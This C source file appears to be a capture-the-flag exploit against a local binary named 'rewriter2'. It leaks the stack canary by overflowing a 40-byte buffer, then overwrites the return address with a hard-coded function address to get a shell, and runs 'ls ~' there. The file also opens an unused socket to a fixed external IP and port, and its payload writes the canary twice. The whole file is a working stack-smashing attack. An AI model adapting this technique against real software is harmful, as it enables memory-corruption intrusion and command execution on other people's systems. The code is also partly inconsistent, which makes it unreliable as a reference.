#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define READ 0
#define WRITE 1

int main(){
	int inpipe[2];
	int outpipe[2];
	pid_t pid;

	char add1[4];
	char add2[4];

    int ctf_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("153.125.146.144");
    servaddr.sin_port = htons(9001);
    int rc = connect(ctf_socket, (struct sockaddr*)&servaddr, sizeof(servaddr));
    if(rc < 0){ printf("connect error\n"); exit(0);}

	if(pipe(inpipe) == -1){
		perror("inpipe error");
		exit(EXIT_FAILURE);	
	}
	if(pipe(outpipe) == -1){
		perror("outpipe error");
		exit(EXIT_FAILURE);	
	}

	pid = fork();
	if(pid == -1){
		perror("fork error");
		exit(EXIT_FAILURE);	
	}

	if(pid == 0){
        close(inpipe[WRITE]);
        close(outpipe[READ]);
		if(dup2(inpipe[READ], 0) == -1){
			perror("dup stdin error");
			exit(EXIT_FAILURE);	
		}
		if(dup2(outpipe[WRITE], 1) == -1){
			perror("dup stdout error");
			exit(EXIT_FAILURE);	
		}
        close(inpipe[READ]);
        close(outpipe[WRITE]);
		if(execl("./rewriter2", "rewriter2", NULL) == -1){
			perror("exec rewriter error");
			exit(EXIT_FAILURE);	
		}
	}else{
		const char* name = "hello";
		const int age = 24;
		char buffer[1024];
		int size;

		sleep(1);
        memset(buffer, 0, 1024);
        size = read(outpipe[0], buffer, 1024);
        printf("%s", buffer);
		printf("\n");

        char c = 'A', b = 'B';
        for(int i = 0; i < 40; i++){
            write(inpipe[1], &c, 1);
        }
        write(inpipe[1], &b, 1);
			
		sleep(1);
        memset(buffer, 0, 1024);
        size = read(outpipe[0], buffer, 1024);
        printf("%s", buffer);
        unsigned char canary[8];
        int canary_ind = -1;
        for(int i = 0; i < 1024; i++){
            if(buffer[i] == 'B'){
                canary[0] = 0;
                canary_ind = 1;
                continue;
            }
            if(canary_ind >= 0 && canary_ind < 8){
                canary[canary_ind] = buffer[i];
                canary_ind++;
            }
        }
        printf("\ncanary = 0x");
        for(int i = 0; i< 8 ; i++){
            printf("%02x", canary[i]);
        }
		printf("\n");

        for(int i = 0; i < 40; i++){
            write(inpipe[1], &c, 1);
        }
        write(inpipe[1], canary, 8);
        char rbps[8] = {0};
        char winaddress[8] = { 0xd6, 0x12, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00 };
        write(inpipe[1], canary, 8);
        write(inpipe[1], winaddress, 8);
		
        sleep(1);
        memset(buffer, 0, 1024);
        size = read(outpipe[0], buffer, 1024);
        printf("%s", buffer);
		printf("\n");

        write(inpipe[1], "ls ~\n", 5);
        sleep(1);
        memset(buffer, 0, 1024);
        size = read(outpipe[0], buffer, 1024);
        printf("%s", buffer);

        
		if(wait(NULL) == -1){
			perror("wait rewriter error");
			exit(EXIT_FAILURE);	
		}
	}
}
